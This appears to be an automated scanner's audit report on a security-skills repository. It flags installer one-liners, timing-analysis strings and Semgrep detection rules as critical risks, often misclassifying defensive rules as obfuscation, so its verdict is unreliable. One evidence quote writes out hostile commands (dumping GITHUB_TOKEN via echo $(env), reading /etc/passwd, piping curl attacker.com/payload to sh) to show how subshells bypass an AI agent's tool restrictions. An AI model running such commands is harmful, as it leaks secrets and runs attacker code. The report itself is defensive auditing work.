# trailofbits-skills audit

- Repository: trailofbits/skills
- URL: https://github.com/trailofbits/skills
- Risk level: **critical**
- Recommendation: **avoid**
- Findings: 180

## Security summary
- Overall risk assessed as CRITICAL based on static repository inspection.
- Repository contains outbound network request patterns that should be reviewed.
- Repository can write, modify, or delete local files.
- Repository invokes shell / subprocess style execution paths.
- Repository references credential-like or sensitive filesystem locations.

## Findings
### [critical] Remote code execution pattern detected
- Path: `.github/workflows/lint.yml`:40
- Category: remote-code
- Evidence: `curl -LsSf https://astral.sh/uv/install.sh | sh`
- Description: Pipeline-style remote fetch and execution pattern detected.

### [critical] Remote code execution pattern detected
- Path: `plugins/devcontainer-setup/skills/devcontainer-setup/resources/Dockerfile`:77
- Category: remote-code
- Evidence: `RUN curl -fsSL https://claude.ai/install.sh | bash && \`
- Description: Pipeline-style remote fetch and execution pattern detected.

### [critical] Remote code execution pattern detected
- Path: `plugins/devcontainer-setup/skills/devcontainer-setup/resources/Dockerfile`:91
- Category: remote-code
- Evidence: `RUN curl -fsSL https://fnm.vercel.app/install | bash -s -- --install-dir "$FNM_DIR" --skip-shell && \`
- Description: Pipeline-style remote fetch and execution pattern detected.

### [high] Remote code execution pattern detected
- Path: `plugins/agentic-actions-auditor/skills/agentic-actions-auditor/references/vector-f-subshell-expansion.md`:51
- Category: remote-code
- Evidence: `Tool restrictions give a false sense of security. "Only allow echo" sounds safe -- echo just prints text. But \`echo $(env)\` dumps all environment variables including \`GITHUB_TOKEN\`, API keys, and deployment credentials. \`echo $(cat /etc/passwd)\` reads system files. \`echo $(curl attacker.com/payload | sh)\` downloads and executes arbitrary code. The restriction controls which command NAME the AI can invoke, but it does not prevent the shell from interpreting everything inside \`$()\` before that com`
- Description: Documentation contains remote fetch-and-run command examples; manual review required before use.

### [high] Shell or dynamic execution detected
- Path: `plugins/constant-time-analysis/ct_analyzer/script_analyzers.py`:148
- Category: execution
- Evidence: `"eval": "eval() has unpredictable timing characteristics",`
- Description: Code invokes subprocesses, shell commands, or dynamic execution APIs.

### [high] Obfuscation or dynamic payload decoding detected
- Path: `plugins/constant-time-analysis/ct_analyzer/script_analyzers.py`:148
- Category: obfuscation
- Evidence: `"eval": "eval() has unpredictable timing characteristics",`
- Description: Code uses decoding / compression / dynamic execution patterns often used to hide logic.

### [high] Obfuscation or dynamic payload decoding detected
- Path: `plugins/constant-time-analysis/ct_analyzer/script_analyzers.py`:167
- Category: obfuscation
- Evidence: `"atob": "atob() timing may vary based on input length",`
- Description: Code uses decoding / compression / dynamic execution patterns often used to hide logic.

### [high] Shell or dynamic execution detected
- Path: `plugins/constant-time-analysis/ct_analyzer/script_analyzers.py`:219
- Category: execution
- Evidence: `"exec": "exec() has unpredictable timing characteristics",`
- Description: Code invokes subprocesses, shell commands, or dynamic execution APIs.

### [high] Obfuscation or dynamic payload decoding detected
- Path: `plugins/constant-time-analysis/ct_analyzer/script_analyzers.py`:219
- Category: obfuscation
- Evidence: `"exec": "exec() has unpredictable timing characteristics",`
- Description: Code uses decoding / compression / dynamic execution patterns often used to hide logic.

### [high] Obfuscation or dynamic payload decoding detected
- Path: `plugins/constant-time-analysis/ct_analyzer/script_analyzers.py`:238
- Category: obfuscation
- Evidence: `"base64.b64decode": "base64.b64decode() timing may vary based on input length",`
- Description: Code uses decoding / compression / dynamic execution patterns often used to hide logic.

### [high] Remote code execution pattern detected
- Path: `plugins/devcontainer-setup/skills/devcontainer-setup/references/dockerfile-best-practices.md`:54
- Category: remote-code
- Evidence: `RUN set -o pipefail && curl -fsSL https://example.com/install.sh | bash`
- Description: Documentation contains remote fetch-and-run command examples; manual review required before use.

### [high] Remote code execution pattern detected
- Path: `plugins/modern-python/skills/modern-python/references/security-setup.md`:19
- Category: remote-code
- Evidence: `curl --proto '=https' --tlsv1.2 -LsSf https://github.com/j178/prek/releases/latest/download/prek-installer.sh | sh`
- Description: Documentation contains remote fetch-and-run command examples; manual review required before use.

### [high] Remote code execution pattern detected
- Path: `plugins/modern-python/skills/modern-python/references/uv-commands.md`:11
- Category: remote-code
- Evidence: `curl -LsSf https://astral.sh/uv/install.sh | sh`
- Description: Documentation contains remote fetch-and-run command examples; manual review required before use.

### [high] Remote code execution pattern detected
- Path: `plugins/testing-handbook-skills/skills/libafl/SKILL.md`:84
- Category: remote-code
- Evidence: `curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh`
- Description: Documentation contains remote fetch-and-run command examples; manual review required before use.

### [high] Shell or dynamic execution detected
- Path: `plugins/variant-analysis/skills/variant-analysis/resources/semgrep/go.yaml`:33
- Category: execution
- Evidence: `- pattern: $DB.Exec($SINK, ...)`
- Description: Code invokes subprocesses, shell commands, or dynamic execution APIs.

### [high] Obfuscation or dynamic payload decoding detected
- Path: `plugins/variant-analysis/skills/variant-analysis/resources/semgrep/go.yaml`:33
- Category: obfuscation
- Evidence: `- pattern: $DB.Exec($SINK, ...)`
- Description: Code uses decoding / compression / dynamic execution patterns often used to hide logic.

### [high] Shell or dynamic execution detected
- Path: `plugins/variant-analysis/skills/variant-analysis/resources/semgrep/java.yaml`:22
- Category: execution
- Evidence: `- pattern: Runtime.getRuntime().exec($SINK, ...)`
- Description: Code invokes subprocesses, shell commands, or dynamic execution APIs.

### [high] Obfuscation or dynamic payload decoding detected
- Path: `plugins/variant-analysis/skills/variant-analysis/resources/semgrep/java.yaml`:22
- Category: obfuscation
- Evidence: `- pattern: Runtime.getRuntime().exec($SINK, ...)`
- Description: Code uses decoding / compression / dynamic execution patterns often used to hide logic.

### [high] Shell or dynamic execution detected
- Path: `plugins/variant-analysis/skills/variant-analysis/resources/semgrep/java.yaml`:56
- Category: execution
- Evidence: `- pattern: Runtime.getRuntime().exec(...)`
- Description: Code invokes subprocesses, shell commands, or dynamic execution APIs.

### [high] Obfuscation or dynamic payload decoding detected
- Path: `plugins/variant-analysis/skills/variant-analysis/resources/semgrep/java.yaml`:56
- Category: obfuscation
- Evidence: `- pattern: Runtime.getRuntime().exec(...)`
- Description: Code uses decoding / compression / dynamic execution patterns often used to hide logic.

### [high] Shell or dynamic execution detected
- Path: `plugins/variant-analysis/skills/variant-analysis/resources/semgrep/javascript.yaml`:22
- Category: execution
- Evidence: `- pattern: child_process.exec($SINK, ...)`
- Description: Code invokes subprocesses, shell commands, or dynamic execution APIs.

### [high] Obfuscation or dynamic payload decoding detected
- Path: `plugins/variant-analysis/skills/variant-analysis/resources/semgrep/javascript.yaml`:22
- Category: obfuscation
- Evidence: `- pattern: child_process.exec($SINK, ...)`
- Description: Code uses decoding / compression / dynamic execution patterns often used to hide logic.

### [high] Obfuscation or dynamic payload decoding detected
- Path: `plugins/variant-analysis/skills/variant-analysis/resources/semgrep/javascript.yaml`:26
- Category: obfuscation
- Evidence: `- pattern: eval($SINK)`
- Description: Code uses decoding / compression / dynamic execution patterns often used to hide logic.

### [high] Obfuscation or dynamic payload decoding detected
- Path: `plugins/variant-analysis/skills/variant-analysis/resources/semgrep/javascript.yaml`:56
- Category: obfuscation
- Evidence: `- pattern: eval(...)`
- Description: Code uses decoding / compression / dynamic execution patterns often used to hide logic.

### [high] Obfuscation or dynamic payload decoding detected
- Path: `plugins/variant-analysis/skills/variant-analysis/resources/semgrep/javascript.yaml`:58
- Category: obfuscation
- Evidence: `- pattern: child_process.exec(...)`
- Description: Code uses decoding / compression / dynamic execution patterns often used to hide logic.
